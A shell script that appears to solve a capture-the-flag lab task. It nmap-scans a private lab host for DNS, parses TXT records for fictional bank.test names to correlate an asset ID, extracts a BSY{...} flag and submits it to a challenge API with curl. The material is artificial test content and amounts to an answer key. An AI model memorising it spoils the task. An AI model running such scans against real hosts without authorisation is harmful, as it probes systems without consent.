#!/bin/sh
set -eu

host=172.20.0.141
nmap -n -sU -p 53 --open "$host" >/dev/null

flag=$(python3 - "$host" <<'PY'
import random
import re
import socket
import struct
import sys

server = sys.argv[1]

def query(name):
    ident = random.randrange(65536)
    labels = name.rstrip('.').split('.')
    qname = b''.join(bytes([len(label)]) + label.encode() for label in labels) + b'\0'
    packet = struct.pack('!HHHHHH', ident, 0x0100, 1, 0, 0, 0) + qname + struct.pack('!HH', 16, 1)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(packet, (server, 53))
    data, _ = sock.recvfrom(4096)
    sock.close()
    if len(data) < 12 or struct.unpack('!H', data[:2])[0] != ident:
        raise RuntimeError('invalid DNS response')
    _, flags, qd, an, _, _ = struct.unpack('!HHHHHH', data[:12])
    if flags & 0x000f:
        raise RuntimeError('DNS query failed')
    pos = 12
    for _ in range(qd):
        while data[pos] != 0:
            if data[pos] & 0xc0 == 0xc0:
                pos += 2
                break
            pos += data[pos] + 1
        else:
            pos += 1
        pos += 4
    answers = []
    for _ in range(an):
        if data[pos] & 0xc0 == 0xc0:
            pos += 2
        else:
            while data[pos] != 0:
                pos += data[pos] + 1
            pos += 1
        rtype, rclass, ttl, rdlen = struct.unpack('!HHIH', data[pos:pos+10])
        pos += 10
        rdata = data[pos:pos+rdlen]
        pos += rdlen
        if rtype == 16 and rclass == 1:
            chunks = []
            i = 0
            while i < len(rdata):
                size = rdata[i]
                i += 1
                chunks.append(rdata[i:i+size].decode())
                i += size
            answers.append(''.join(chunks))
    return answers

catalog = ' '.join(query('catalog.bank.test'))
settlement = ' '.join(query('settlement.bank.test'))
assets = set(re.findall(r'AX-\d+', catalog))
match = re.search(r'asset=(AX-\d+)', settlement)
if not match or match.group(1) not in assets:
    raise RuntimeError('could not correlate the settlement asset')
records = ' '.join(query('claim-' + match.group(1) + '.bank.test'))
flag_match = re.search(r'receipt=(BSY\{[^}]+\})', records)
if not flag_match:
    raise RuntimeError('the correlated claim record did not contain a flag')
print(flag_match.group(1))
PY
)

curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' \
  --data-binary "{\"challenge_id\":\"scl-challenge-frame-a3face\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
